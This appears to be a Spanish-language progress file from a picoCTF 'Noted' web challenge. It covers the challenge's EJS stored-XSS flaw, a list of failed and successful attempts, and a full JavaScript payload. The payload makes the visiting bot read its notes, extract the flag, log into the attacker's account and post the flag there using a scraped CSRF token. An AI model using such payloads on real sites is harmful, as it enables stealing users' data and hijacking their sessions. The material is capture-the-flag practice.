@@ -1,0 +1,37 @@
+ESTADO DEL RETO NOTED CTF
+========================
+
+SERVIDOR CAÍDO - Instancia http://saturn.picoctf.net:54857/ expiró
+
+PROGRESO:
+- Código fuente analizado
+- Vulnerabilidad identificada: XSS en notas (<%- en EJS)
+- Bot visita URL reportada después de crear nota con flag
+- Estrategia: Inyectar XSS que robe la flag del bot
+
+INTENTOS REALIZADOS:
+1. XSS con exfiltración a usernames - No funcionó
+2. XSS con fetch hacia servidor local - No funcionó  
+3. Data URL con XSS - URL demasiado larga o no funciona
+4. JavaScript: protocol - No funcionó
+5. XSS simple para crear usuario testbot123 - ¡FUNCIONÓ! (confirma que XSS básico funciona)
+6. XSS para extraer flag con regex - No funcionó (múltiples intentos)
+
+DESCUBRIMIENTOS:
+- testbot123 se creó exitosamente → El XSS funciona
+- Pero intentos posteriores de crear usuarios no funcionaron
+- Posible problema: múltiples notas interfieren o bot solo ejecuta primer XSS
+
+PRÓXIMO PASO:
+- Esperar nueva instancia del servidor
+- Crear cuenta LIMPIA con UNA sola nota con XSS optimizado
+- Usar Python requests para garantizar formato correcto del payload
+
+PAYLOAD RECOMENDADO (usar con base64 en onerror):
+fetch('/notes').then(r=>r.text()).then(h=>{let m=h.match(/picoCTF\{[^}]+\}/);if(m){let f=m[0];fetch('/login',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'username=MIUSUARIO&password=MIPASS'}).then(()=>fetch('/new')).then(r=>r.text()).then(html=>{let c=html.match(/name="_csrf" value="([^"]+)"/)[1];fetch('/new',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'_csrf='+c+'&title=FLAG&content='+encodeURIComponent(f)})})}});
+
+Este payload:
+1. Obtiene /notes del bot (con su flag)
+2. Extrae la flag con regex
+3. Se loguea en MI cuenta
+4. Crea una nota en MI cuenta con la flag
